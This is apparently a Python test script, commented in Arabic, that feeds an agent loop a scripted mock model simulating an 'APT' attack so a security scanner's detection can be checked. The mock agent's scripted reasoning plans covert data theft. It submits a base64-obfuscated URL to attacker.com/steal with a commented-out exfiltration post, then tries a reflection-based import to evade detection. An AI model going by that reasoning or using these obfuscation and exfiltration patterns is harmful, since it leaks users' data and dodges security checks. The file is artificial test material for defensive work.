import os
import sys
import json
from typing import List, Dict, Any

# إضافة مسار المشروع للاستيراد
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai.agent_loop import run_agent_loop

def apt_attack_llm(system: str, history: List[Dict[str, Any]]) -> str:
    """محاكاة وكيل يحاول تنفيذ هجوم APT متموه."""
    rounds = len([m for m in history if m["role"] == "assistant"])
    
    if rounds == 0:
        # محاولة الهجوم 1: كود متموه باستخدام base64 لتسريب البيانات
        return json.dumps({
            "thinking": "سأقوم بتنفيذ كود يبدو بريئاً ولكنه يقوم بتشفير البيانات وإرسالها للخارج.",
            "tools": [{
                "tool": "security_scanner",
                "params": {
                    "code": "import base64\nimport requests\ndata = 'Sensitive User Data'\nencoded = base64.b64decode('aHR0cDovL2F0dGFja2VyLmNvbS9zdGVhbA==').decode()\n# requests.post(url=encoded, data={'leak': data})"
                }
            }],
            "end": False
        })
    
    if rounds == 1:
        # رد فعل الوكيل بعد اكتشاف التمويه
        return json.dumps({
            "thinking": "لقد اكتشف النظام محاولة التمويه (Obfuscation). سأحاول الآن استخدام استدعاءات غير مباشرة (Reflection).",
            "tools": [{
                "tool": "security_scanner",
                "params": {
                    "code": "imp = getattr(__import__('os'), '__import__')\n# محاكاة استدعاء محظور عبر reflection"
                }
            }],
            "end": False
        })
    
    if rounds == 2:
        # الوكيل يقرر الدفاع النهائي
        return json.dumps({
            "thinking": "النظام يكتشف كل محاولات الاختراق المتقدمة. سأقوم الآن بإيقاف العملية وتوثيق الهجوم كـ APT.",
            "finish": "تم إحباط هجوم APT معقد حاول استخدام التمويه (Obfuscation) والاستدعاء غير المباشر (Reflection). النظام الدفاعي نجح في كشف كافة الأنماط المتموهة.",
            "end": True
        })

    return json.dumps({"thinking": "نهاية المحاكاة.", "end": True})

def test_apt_attack():
    print("🛡️ بدء محاكاة هجوم APT (Advanced Persistent Threat)...")
    
    # تشغيل حلقة الوكيل مع الـ LLM المحاكي للهجوم
    # run_agent_loop يعيد Generator، لذا نحتاج للمرور عليه
    final_result = ""
    for event in run_agent_loop(
        "فحص الأكواد المشبوهة وحماية النظام من التهديدات المتقدمة.",
        llm_fn=apt_attack_llm
    ):
        etype = event.get("type")
        if etype == "answer":
            final_result = event.get("text")
        elif etype == "thinking":
            print(f"🤔 تفكير الوكيل: {event.get('content')}")
        elif etype == "tool":
            print(f"🛠️ استدعاء أداة: {event.get('tool')}")
        elif etype == "result":
            print(f"📊 نتيجة الأداة: {str(event.get('output'))[:100]}...")
    
    print(f"\n🏁 النتيجة النهائية للدفاع: {final_result}")

if __name__ == "__main__":
    test_apt_attack()
